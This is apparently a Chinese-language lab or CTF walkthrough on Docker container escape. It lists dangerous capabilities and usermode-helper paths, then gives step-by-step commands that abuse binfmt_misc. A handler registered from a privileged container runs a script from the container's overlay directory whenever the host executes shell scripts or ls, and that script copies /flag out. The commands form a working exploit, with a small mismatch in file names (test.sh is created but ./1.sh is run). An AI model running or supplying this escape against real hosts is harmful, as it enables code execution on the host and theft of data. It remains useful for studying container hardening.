# Container-escape-in-2021

特权cap实现容器逃逸：

- CAP_SYS_MODULE 
- CAP_SYS_ADMIN 
- CAP_DAC_READ_SEARCH



通过usermod helper逃逸：

- /proc/sys/kernel/modprobe 
- /proc/sys/kernel/core_pattern 
- /sys/kernel/uevent_helper 
- /sys/fs/cgroup/*/release_agent 
- /proc/sys/fs/binfmt_misc

## binfmt_misc容器逃逸

环境，将`binfmt_misc`挂载在容器中：

```bash
docker run -it --name binfmt_misc --security-opt apparmor:unconfined --cap-add SYS_ADMIN ubuntu:22.04

mount binfmt_misc -t binfmt_misc /proc/sys/fs/binfmt_misc
mount -o rw,remount /proc/sys
```

Linux内核有一个名为Miscellaneous Binary Format（binfmt_misc）的机制，可以通过要打开文件的特性来选择到底使用哪个程序来打开。这种机制可以通过文件的扩展名或文件开始位置的特殊的字节（Magic Byte）来判断应该如何打开文件。



通过写`/proc/sys/fs/binfmt_misc/register`来注册一个拦截器，拦截器将自动拦截magic byte为我们设置的字节的可执行文件，交给拦截器来执行，从来实现容器逃逸。

这种容器逃逸需要拦截的是宿主机的可执行文件。

其 binfmt 的格式如下：

```
name:type:offset:magic:mask:interpreter:flags
```

这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。 各个字段的意义如下：

- name：规则名
- type：表示如何匹配被打开的文件，值为 E 或 M 。E 表示根据扩展名识别，而 M 表示根据文件特定位置的Magic Bytes来识别
- offset：type字段设置成 M 之后有效，表示查找Magic Bytes的偏移，默认为0
- magic：表示要匹配的Magic Bytes，type字段为 M 时，表示文件的扩展名，扩展名是大小写敏感的，不需要包含 .。type字段为 E 时，表示Magic Bytes，其中不可见字符可以通过 \xff 的方式来输出
- mask：type字段设置成 M 之后有效，长度与Magic Bytes的长度一致。如果某一位为1，表magic对应的位匹配，为0则忽略。默认为全部匹配
- interpreter：启动文件的程序，需要是绝对路径
- flags: 可选字段，控制interpreter打开文件的行为。共支持 POCF 四种flag。

```bash
#容器上执行
mount|grep -i "upperdir"
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/OIPS7XI32CDHOFUSV7QR5IUSYD:/var/lib/docker/overlay2/l/ZR2BR7ZSSDQWVKIYYV4CDWAAMN,upperdir=/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff,workdir=/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/work)
#容器上执行
echo ":feng:M::\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68::/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/exploit:" > /proc/sys/fs/binfmt_misc/register 
#容器上执行
echo '#!/bin/bash'>/tmp/exploit
#容器上执行
echo 'cat /flag > /var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/flag' >> /tmp/exploit
#容器上执行
chmod +x /tmp/exploit
#宿主机上执行
echo '#!/bin/sh'> /tmp/test.sh
#宿主机上执行
echo 'echo test'>> /tmp/test.sh
#宿主机上执行
chmod +x /tmp/test.sh
#宿主机上执行
./1.sh
#容器上执行
cat /tmp/flag
```



拦截ls的例子：

```bash
echo ":feng:M:208:\xd0\x35::/var/lib/docker/overlay2/2765b06fd75fd86370793d20a2f7fd41c0d754ccb4d9864442bfe7d5c2441081/diff/tmp/exploit:" > /proc/sys/fs/binfmt_misc/register 
```

因为ls这个可执行文件偏移208个字节为`\xd0\x35`。如果要拦截其他可执行文件同理。

